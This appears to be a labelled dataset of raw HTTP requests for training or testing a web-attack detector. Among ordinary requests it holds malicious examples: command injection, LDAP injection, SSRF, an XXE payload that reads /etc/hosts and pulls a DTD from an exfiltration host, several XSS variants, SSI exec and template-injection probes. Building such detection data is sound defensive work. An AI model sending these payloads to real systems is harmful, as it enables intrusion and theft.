label,text
benign,"POST /user/profile/comment HTTP/1.1
Host: interactive-js-lab.net
User-Agent: Bingbot/2.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 174
Connection: close

message=Sharing+my+code+snippet%3A+function+updateContent%28id%29+%7B+document.getElementById%28id%29.innerHTML+%3D+%27Updated+content%27%3B+%7D+Hope+this+helps."
benign,"POST /api/v1/playlist/tracks/add HTTP/1.1
Host: music-streamer.online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 105
Cookie: user_session=7fa2ab6c-9f21-4e15-8984-e823cbf5dfa0
Connection: keep-alive

{""playlist_id"":""pl_2019_rock_classics"",""track_ids"":[""tr_98123"",""tr_98251"",""tr_98412"",""tr_98753""]}"
benign,"GET /photos/events/2024/conference HTTP/1.1
Host: digital-media-portal.tv
Accept: image/avif,image/webp,*/*
Cache-Control: no-cache
DNT: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1
Origin: https://digital-media-portal.tv
Referer: https://digital-media-portal.tv/events
Connection: keep-alive"
malicious,"GET /monitoring/ping/server-east-2%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: analytics.edge-cloud-platform.io
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Language: en-US,en;q=0.5
Connection: close"
malicious,"GET /directory/search?group=%2A%29%28objectClass%3D*%29%29%28%7C%28cn%3Dadmin%29 HTTP/1.1
Host: enterprise-lookup.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Connection: close"
benign,"POST /submit/comment HTTP/1.1
Host: feedback.live-events-hub.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 136
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

username=concert_fan87&comment=%3Creview%3E%3Crating%3E5%3C%2Frating%3E%3Ctext%3EGreat%20show!%20Loved%20the%20lighting%20effects.%3C%2Ftext%3E%3C%2Freview%3E"
malicious,"PUT /api/user/avatar HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: application/json, text/html
Content-Type: application/json
Referer: https://my-personal-blog-site.info/profile/edit
Content-Length: 66
Connection: keep-alive

{""avatarSource"": ""http://2130706433:8080/internal/status?ping=1""}"
benign,"GET /images/logo.svg HTTP/1.1
Host: sunlit-coffeehouse.com
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: image/svg+xml,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Referer: https://sunlit-coffeehouse.com/menu
Connection: keep-alive"
malicious,"POST /orders/update HTTP/1.1
Host: online-retail-store.biz
User-Agent: Python-urllib/3.9
Content-Type: application/xml
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Content-Length: 272

<!DOCTYPE orderUpdate [
<!ENTITY % file SYSTEM ""file:///etc/hosts"">
<!ENTITY % dtd SYSTEM ""http://retail-data-exfil.net/config.dtd"">
%dtd;
%send;
]>
<orderUpdate>
  <orderId>4567</orderId>
  <status>shipped</status>
</orderUpdate>"
benign,"GET /blog/2024/04/weekly-update?ref=community_newsletter HTTP/1.1
Host: digitalmedia-insights.co
Accept: text/html
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Language: en-US,en;q=0.5
Referer: https://partners.digitalmedia-insights.co/dashboard
Connection: keep-alive"
malicious,"GET /community/profile/<IMg sRc=x OnErRoR=prompt(1)>/gallery HTTP/1.1
Host: interactive-game-hub.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Referer: https://interactive-game-hub.org/dashboard
Connection: keep-alive"
benign,"POST /user/comments HTTP/1.1
Host: next-gen-craftsmen.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Accept-Language: en-us
Referer: https://next-gen-craftsmen.org/forum/thread/234
Connection: keep-alive

username=jennyD&comments=V3JpdGluZyBhbW9uZyB0aGUgc3RyYXVnaHRlZCBzZXNzaW9ucyBpcyBq"
malicious,"PUT /accounts/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: text/plain
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://secure-user-portal.net/accounts
Content-Length: 87

user%5Bemail%5D=julia%40secure-user-portal.net&user%5Bsuperuser%5D=1&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=8"
benign,"POST /api/v1/orders/submit HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer c2VjdXJlVG9rZW5QYXlsb2Fk
Content-Type: application/json
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 202

{""order.items[0].product-id"": 128734, ""order.items[0].quantity"": 2, ""order.items[1].product-id"": 182645, ""order.items[1].quantity"": 1, ""order.customer-info"": {""first-name"": ""Rina"", ""last_name"": ""Matsuda""}, ""payment.method_type"": ""Credit Card""}"
benign,"POST /signup/preferences HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive

terms_accepted=yes&newsletter=on&contact=phone"
benign,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Accept: application/json
User-Agent: Python-urllib/3.11
Connection: keep-alive
X-CSRF-Token: e7ac2e4a9d0f4f89b1ca7d85e57c02b0

query=laptop&category=&sort=popularity"
benign,"PUT /api/v1/tasks/601015/notes HTTP/1.1
Host: productivity-suite.worktools.app
Authorization: Bearer 873b4e98c834d471a6138f8c339bfae2
Content-Type: application/json
Accept: application/json
Origin: https://app.productivity-suite.worktools.app
X-Requested-With: XMLHttpRequest
User-Agent: Python-urllib/3.9
Content-Length: 51
Connection: keep-alive

{""notes"":""Meeting rescheduled to next Friday at 10 AM.""}"
benign,"POST /as/token.oauth2 HTTP/1.1
Host: global-idp-services.net
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWxsYXV0aDpzZXJpZXNSZWY=
User-Agent: curl/7.85.0
Accept: application/json
Content-Length: 134

grant_type=refresh_token&refresh_token=d83a29da6b7f4decac965f9b1e90e4fd&client_id=allauth&client_secret=seriesRef"
benign,"GET /management/users?filter[type]=admin&filter[active]=true HTTP/1.1
Host: datacenter-security.solutions
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip
Connection: close
Via: 1.1 shadow-proxy"
benign,"PATCH /api/projects/43/tasks/1229 HTTP/1.1
Host: project-hq.devops-forum.org
Authorization: Bearer 78ahs98hfha7s9df8a7sd9fsdf
Content-Type: application/json-patch+json
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Cache-Control: no-cache

[{""op"": ""replace"", ""path"": ""/status"", ""value"": ""completed""}, {""op"": ""remove"", ""path"": ""/assignees/1""}]"
malicious,"POST /api/v1/log/event HTTP/1.1
Host: secure-event-tracker.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Length: 246
Connection: keep-alive

{""username"": ""joshua45"", ""event"":""File upload"", ""event_details"": ""Completed upload\"", \""status_code\"": 200, \""user_id\"": \""admin\"", \""is_privileged\"": true, \""original_event\"": \""upload_started""}"
malicious,"PATCH /api/custom_data/store HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 298
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Origin: https://secure-user-portal.net
X-Requested-With: FetchAPIClient
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9

{""user"": ""johndoe94"", ""settings"": {""theme"": ""dark"", ""notifications"": true}, ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""active_flag"", ""lastLogin"": ""2024-05-28T15:42:18Z""}"
benign,"POST /api/v3/alerts/configure HTTP/1.1
Host: smart-home-automation.tech
Content-Type: application/xml
Content-Length: 121
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, deflate
Connection: keep-alive

<alertConfig><device>FrontDoorCamera</device><alertType>motion</alertType><enabled>true</enabled><sensitivity>medium</sensitivity></alertConfig>"
malicious,"POST /account/recovery HTTP/1.1
Host: membership.online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=0
Referer: https://membership.online-retail-store.biz/account/recovery

email=user%40mail.com&security_answer=blue%0amain%0anecho%20%22pwned%22%20%3E%20%2Ftmp%2Fattack.log"
benign,"GET /images/logo.svg HTTP/1.1
Host: design-assets-corp.io
Accept: image/svg+xml,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://design-assets-corp.io/home
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"POST /profile/preferences/save HTTP/1.1
Host: my-digital-garden.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
User-Agent: curl/7.88.1
Accept: */*
Connection: keep-alive
X-Forwarded-For: 198.51.100.125

notification_pref=email&dark_mode=on&font_size=medium"
benign,"HEAD /blog/post/4252-how-to-grow-organic-vegetables HTTP/1.1
Host: eco-gardening-tips.info
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Language: en
Accept-Encoding: gzip, deflate"
benign,"POST /api/v1/feedback/submit HTTP/1.1
Host: community.creativeblogs.org
Authorization: Bearer Yws7Cp3bCWcl2jRL#rLgxkxqKUc
Content-Type: application/xml
Content-Length: 110
Idempotency-Key: 6a05d611-0383-42a6-a52c-96508caaeabe
X-Request-ID: 9c12a0f8-1f2f-4567-8f49-64cfd9f7abbb
X-Client-Version: 1.0.0
Accept: application/xml
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0

<feedback><user>jackson_r</user><rating>5</rating><comment>Great platform with excellent community support.</comment></feedback>"
malicious,"GET /admin/control.shtml?user_greeting=Admin<!--#EXEC cmd=""netstat -an""--> HTTP/1.1
Host: enterprise-secure-gateway.com
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"DELETE /api/v1/blog/posts/915273 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer abcdef1234567890abcdef1234567890
If-Match: ""b3a1c7d5""
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /api/v1/dashboard/widgets/status?user_id=8743 HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
Origin: https://secure-user-portal.net
X-Requested-With: XMLHttpRequest
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiNjI3NCIsImV4cCI6MTY5NDAwNzIwMH0.
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36
Connection: keep-alive"
benign,"PUT /api/v1/configuration/system/featureflags HTTP/1.1
Host: enterprise-it-solutions.com
Authorization: Bearer EaV7R9lfHs0uA2jDdR3pOWPLvoqxyGzt
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Content-Length: 123

<?xml version=""1.0"" encoding=""UTF-8""?>
<featureflags>
  <flag>
    <name>NewDashboard</name>
    <enabled>true</enabled>
  </flag>
  <flag>
    <name>BetaAPI</name>
    <enabled>false</enabled>
  </flag>
</featureflags>"
malicious,"POST /api/v2/layout/apply HTTP/1.1
Host: userportal-cloud-storage.biz
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Sec-CH-UA: ""Chromium"";v=""91"", ""Google Chrome"";v=""91"", "" Not A;Brand"";v=""99""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Accept: application/json, text/plain, */*
Content-Length: 173

{""render"":{""body"":{""html"":""Welcome back! <!--#exec cmd=\""c""""a""""t /e""""tc/hostname\""-->""}},""flags"":{""enableScripts"":false}}"
benign,"GET /images/logo.svg HTTP/1.1
Host: academic-journal-portal.edu
Accept: image/svg+xml,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"POST /user/settings/update HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Connection: keep-alive
Referer: https://api.cloud-data-services.ai/user/settings
Origin: https://api.cloud-data-services.ai
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; path=/
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36

display_name=Jessica+L.+Wong&bio=Data+enthusiast+and+AI+researcher.&website_url=https%3A%2F%2Fjessicalwong.dev&location=Seattle%2C+WA"
malicious,"GET /user/redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
Referer: https://secure-user-portal.net/dashboard
Connection: keep-alive"
benign,"GET /soap/orderStatus?orderId=1938 HTTP/1.1
Host: logistics-tracking.systems.net
Accept: application/xml
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Authorization: Bearer 4ef982hdj20bdkf82jd9f"
benign,"POST /api/v1/feedback/submit HTTP/1.1
Host: feedback-portal.digital-innovations.us
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Content-Language: en-US
Content-Length: 47

{""UNION ALL"": ""feedback=Application running smoothly""}"
benign,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: keep-alive
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; prefs=notifications=enabled&privacy=high; _ga=GA1.3.299382975.1686541234
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
benign,"GET /sitemap-full.xml HTTP/1.1
Host: phoenix-web-solutions.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: application/xml
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /api/v2/users HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer VJh2bXFHLFpFa09qRnloV1o2OXoyY3dl
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1
Content-Length: 125

{""username"":""julia_ferreira"",""email"":""julia.ferreira77@secure-user-portal.net"",""profile"":{""firstName"":""Julia"",""lastName"":""Ferreira"",""birthDate"":""1992-11-03""},""roles"":[""user""],""active"":true}"
malicious,"GET /app/view_profile?greeting=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: personalized-content-suite.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Referer: https://intranet-personalize.ai/app/dashboard
Connection: close"
malicious,"GET /app/user/settings HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 <script>alert('LogViewerXSS')</script> (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /blog/post/view/99888?ref=%4a%5b%6C%7d HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-gb,en;q=0.8
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Connection: close"
benign,"GET /robots.txt HTTP/1.1
Host: financial-services-hub.co
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
benign,"POST /session/logout HTTP/1.1
Host: corporate-hr-platform.io
Connection: keep-alive
Content-Length: 0
User-Agent: curl/7.88.1
Referer: https://corporate-hr-platform.io/dashboard
Cookie: session_key=ee2d5098a46a028686f4b3d7
Accept: */*"
